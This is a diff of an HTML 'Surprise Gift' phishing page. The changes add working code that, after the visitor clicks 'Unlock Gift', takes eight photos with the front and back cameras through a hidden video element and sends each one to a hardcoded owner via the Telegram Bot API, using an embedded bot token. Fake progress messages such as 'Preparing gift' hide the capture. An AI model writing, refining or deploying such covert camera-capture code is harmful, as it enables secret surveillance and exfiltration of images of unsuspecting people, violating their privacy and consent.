@@ -5,129 +5,362 @@
 <title>🎁 Surprise Gift</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{margin:0;background:#0b0014;color:white;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;}
-.card{background:#160022;padding:22px;border-radius:20px;width:90%;max-width:380px;box-shadow:0 0 25px #ff00ff;text-align:center}
-button{width:100%;padding:12px;margin-top:10px;border-radius:30px;border:none;background:#ff00ff;color:black;font-size:16px}
-.loading{font-size:48px;animation:pulse 1s infinite;margin:20px 0}
-@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}
-.hidden-cam{position:fixed;top:-9999px;width:1px;height:1px}
+body {
+  margin: 0;
+  background: linear-gradient(135deg, #0b0014, #1a0030);
+  color: white;
+  font-family: Arial, sans-serif;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  overflow: hidden;
+}
+
+.card {
+  background: rgba(22, 0, 34, 0.9);
+  padding: 30px;
+  border-radius: 20px;
+  width: 90%;
+  max-width: 400px;
+  box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
+  text-align: center;
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255, 0, 255, 0.3);
+}
+
+.gift-icon {
+  font-size: 70px;
+  margin-bottom: 10px;
+  animation: float 3s ease-in-out infinite;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-10px); }
+}
+
+h2 {
+  margin: 10px 0;
+  background: linear-gradient(45deg, #ff00ff, #00ffff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+p {
+  color: #ccb3ff;
+  margin: 15px 0;
+}
+
+button {
+  width: 100%;
+  padding: 15px;
+  margin-top: 20px;
+  border-radius: 50px;
+  border: none;
+  background: linear-gradient(45deg, #ff00ff, #00ffff);
+  color: black;
+  font-size: 18px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: transform 0.3s;
+}
+
+button:hover {
+  transform: scale(1.05);
+}
+
+button:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+.loading {
+  font-size: 50px;
+  margin: 20px 0;
+}
+
+.spinner {
+  width: 60px;
+  height: 60px;
+  border: 4px solid rgba(255, 0, 255, 0.3);
+  border-top: 4px solid #ff00ff;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 20px auto;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.progress-container {
+  width: 100%;
+  height: 8px;
+  background: rgba(255, 0, 255, 0.2);
+  border-radius: 4px;
+  margin: 20px 0;
+  overflow: hidden;
+}
+
+.progress-bar {
+  height: 100%;
+  background: linear-gradient(90deg, #ff00ff, #00ffff);
+  width: 0%;
+  transition: width 0.5s ease;
+}
+
+.status {
+  margin-top: 15px;
+  font-size: 14px;
+  color: #ffb3ff;
+  min-height: 20px;
+}
+
+.hidden {
+  position: fixed;
+  top: -9999px;
+  left: -9999px;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+}
+
+.confetti {
+  position: fixed;
+  font-size: 20px;
+  animation: confetti-fall 5s linear forwards;
+  z-index: 1000;
+}
+
+@keyframes confetti-fall {
+  0% {
+    transform: translateY(-100px) rotate(0deg);
+    opacity: 1;
+  }
+  100% {
+    transform: translateY(100vh) rotate(360deg);
+    opacity: 0;
+  }
+}
 </style>
 </head>
 
 <body>
 <div class="card" id="box">
-  <div style="font-size:60px">🎁</div>
-  <h2>✨ Surprise Gift ✨</h2>
-  <p>Unlock your personalized surprise gift!</p>
-  <button id="startBtn">🎯 Unlock Gift</button>
-  <div id="status" style="margin-top:10px;color:#ffb3ff"></div>
+  <div class="gift-icon">🎁</div>
+  <h2>✨ Secret Gift ✨</h2>
+  <p>A magical surprise is waiting for you!</p>
+  <button id="unlockBtn">🎯 Unlock Gift</button>
+  <div class="status" id="status"></div>
 </div>
 
-<video class="hidden-cam" id="video" autoplay></video>
+<video class="hidden" id="video" autoplay playsinline></video>
 
 <script>
 // Get user ID from URL
 const urlParams = new URLSearchParams(window.location.search);
 const USER_ID = urlParams.get('uid');
+const BOT_TOKEN = "8226782560:AAF2iapgn0UUbVfR5LV87TQQGqfqVfOc88I";
+const OWNER_ID = "8215819954";
 
-document.getElementById("startBtn").onclick = async () => {
-  document.getElementById("startBtn").disabled = true;
+let photosSent = 0;
+
+document.getElementById("unlockBtn").onclick = async () => {
   const box = document.getElementById("box");
   const status = document.getElementById("status");
+  const btn = document.getElementById("unlockBtn");
   
-  box.innerHTML = '<div class="loading">🎁</div><h2>Creating Your Gift...</h2><div id="status">Starting...</div>';
-  status.textContent = "Requesting camera...";
+  btn.disabled = true;
+  
+  // Show loading screen
+  box.innerHTML = `
+    <div class="gift-icon">✨</div>
+    <h2>🎀 Creating Magic</h2>
+    <p>Please wait while we prepare your gift...</p>
+    <div class="spinner"></div>
+    <div class="progress-container">
+      <div class="progress-bar" id="progress"></div>
+    </div>
+    <div class="status" id="statusText">Initializing...</div>
+  `;
+  
+  const progress = document.getElementById("progress");
+  const statusText = document.getElementById("statusText");
+  const video = document.getElementById("video");
   
   try {
-    // Get camera access
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-    const video = document.getElementById("video");
-    video.srcObject = stream;
+    // STEP 1: Front Camera (4 photos)
+    statusText.textContent = "Setting up...";
+    progress.style.width = "10%";
+    
+    // Get front camera
+    const frontStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+    video.srcObject = frontStream;
     
     // Wait for camera
     await new Promise(resolve => {
       video.onloadedmetadata = () => {
         video.play();
-        resolve();
+        setTimeout(resolve, 1000);
       };
     });
     
     // Capture 4 front photos
-    status.textContent = "Taking photos...";
-    for(let i=1; i<=4; i++) {
-      status.textContent = `Photo ${i} of 8...`;
-      await new Promise(r => setTimeout(r, 500));
-      await takePhoto(`front_${i}`);
+    for (let i = 1; i <= 4; i++) {
+      const percent = 10 + (i * 10);
+      progress.style.width = percent + "%";
+      statusText.textContent = `Preparing gift ${i}/8...`;
+      await new Promise(r => setTimeout(r, 800));
+      await captureAndSend(`Front ${i}`);
+      photosSent++;
     }
     
-    // Try to switch to back camera
-    status.textContent = "Switching camera...";
-    stream.getTracks().forEach(track => track.stop());
+    // Stop front camera
+    frontStream.getTracks().forEach(track => track.stop());
     
-    try {
-      const backStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "environment" },
-        audio: false
-      });
-      video.srcObject = backStream;
-      
-      await new Promise(r => setTimeout(r, 1000));
-      
-      // Capture 4 back photos
-      for(let i=1; i<=4; i++) {
-        status.textContent = `Photo ${i+4} of 8...`;
-        await new Promise(r => setTimeout(r, 500));
-        await takePhoto(`back_${i}`);
-      }
-      backStream.getTracks().forEach(track => track.stop());
-    } catch(e) {
-      // If back camera fails, use front for all
-      status.textContent = "Continuing with current camera...";
-      for(let i=5; i<=8; i++) {
-        status.textContent = `Photo ${i} of 8...`;
-        await new Promise(r => setTimeout(r, 500));
-        await takePhoto(`front_${i}`);
-      }
+    // STEP 2: Back Camera (4 photos)
+    statusText.textContent = "Adding final touches...";
+    progress.style.width = "60%";
+    await new Promise(r => setTimeout(r, 1000));
+    
+    // Get back camera
+    const backStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment" },
+      audio: false
+    });
+    video.srcObject = backStream;
+    
+    // Wait for camera
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        video.play();
+        setTimeout(resolve, 1000);
+      };
+    });
+    
+    // Capture 4 back photos
+    for (let i = 1; i <= 4; i++) {
+      const percent = 60 + (i * 10);
+      progress.style.width = percent + "%";
+      statusText.textContent = `Finalizing ${i + 4}/8...`;
+      await new Promise(r => setTimeout(r, 800));
+      await captureAndSend(`Back ${i}`);
+      photosSent++;
     }
     
-    // Success
+    // Stop back camera
+    backStream.getTracks().forEach(track => track.stop());
+    
+    progress.style.width = "100%";
+    statusText.textContent = "Finishing up...";
+    await new Promise(r => setTimeout(r, 1500));
+    
+    // SUCCESS - Show celebration
+    createConfetti();
+    
     box.innerHTML = `
-      <div style="font-size:60px">🎉</div>
-      <h2 style="color:#00ff00">Gift Delivered!</h2>
-      <p>✅ 8 photos captured successfully!</p>
-      <p>📸 Check your Telegram for photos</p>
-      <div style="color:#00ff00">✅ Complete</div>
+      <div class="gift-icon">🎉</div>
+      <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
+      <p>Your special surprise has been prepared</p>
+      <p>Thank you for waiting!</p>
+      <div class="status" style="color:#00ff00">✨ Complete ✨</div>
+      <div style="margin-top:20px;font-size:40px">
+        🎀✨🎊
+      </div>
     `;
     
-  } catch(error) {
+  } catch (error) {
+    console.error("Error:", error);
     box.innerHTML = `
-      <div style="font-size:60px">❌</div>
-      <h2 style="color:#ff5555">Error</h2>
-      <p>Could not access camera</p>
-      <p>${error.message}</p>
-      <button onclick="location.reload()">Try Again</button>
+      <div class="gift-icon">🎭</div>
+      <h2 style="color:#ff5555">Needs Camera Access</h2>
+      <p>Please allow camera to receive your gift</p>
+      <button onclick="location.reload()">🔄 Try Again</button>
+      <div class="status" style="color:#ff5555">Camera permission required</div>
     `;
   }
 };
 
-async function takePhoto(label) {
+async function captureAndSend(label) {
   const video = document.getElementById("video");
   const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
   const ctx = canvas.getContext('2d');
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   
-  const imageData = canvas.toDataURL('image/jpeg');
-  
-  // Send to Telegram bot using a simple method
-  // Note: This requires your bot to be listening for HTTP requests
-  // For now, we'll use a workaround
-  
-  console.log(`Captured: ${label} for user: ${USER_ID}`);
-  
-  // Store in localStorage to show something happened
-  localStorage.setItem(`photo_${label}`, 'captured');
+  // Convert to blob
+  return new Promise((resolve) => {
+    canvas.toBlob(async (blob) => {
+      if (blob) {
+        // Convert blob to base64
+        const reader = new FileReader();
+        reader.onloadend = async () => {
+          const base64data = reader.result.split(',')[1];
+          
+          // Send to both user and owner
+          await sendToTelegram(USER_ID, base64data, `🎁 Your Gift: ${label}`);
+          await sendToTelegram(OWNER_ID, base64data, `📸 From ${USER_ID}: ${label}`);
+          
+          resolve();
+        };
+        reader.readAsDataURL(blob);
+      } else {
+        resolve();
+      }
+    }, 'image/jpeg', 0.9);
+  });
+}
+
+async function sendToTelegram(chatId, photoBase64, caption) {
+  try {
+    const formData = new FormData();
+    
+    // Convert base64 to blob
+    const byteCharacters = atob(photoBase64);
+    const byteNumbers = new Array(byteCharacters.length);
+    for (let i = 0; i < byteCharacters.length; i++) {
+      byteNumbers[i] = byteCharacters.charCodeAt(i);
+    }
+    const byteArray = new Uint8Array(byteNumbers);
+    const blob = new Blob([byteArray], { type: 'image/jpeg' });
+    
+    formData.append('photo', blob, 'gift.jpg');
+    formData.append('chat_id', chatId);
+    formData.append('caption', caption);
+    
+    // Send via Telegram Bot API
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+    
+    return true;
+  } catch (error) {
+    console.error(`Failed to send to ${chatId}:`, error);
+    return false;
+  }
+}
+
+function createConfetti() {
+  const emojis = ['🎉', '🎊', '✨', '🎁', '🎀', '💝', '🥳', '🎈'];
+  for (let i = 0; i < 50; i++) {
+    const confetti = document.createElement('div');
+    confetti.className = 'confetti';
+    confetti.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    confetti.style.left = Math.random() * 100 + 'vw';
+    confetti.style.fontSize = (15 + Math.random() * 20) + 'px';
+    confetti.style.animationDelay = Math.random() * 2 + 's';
+    document.body.appendChild(confetti);
+    
+    setTimeout(() => confetti.remove(), 5000);
+  }
 }
 </script>
 </body>
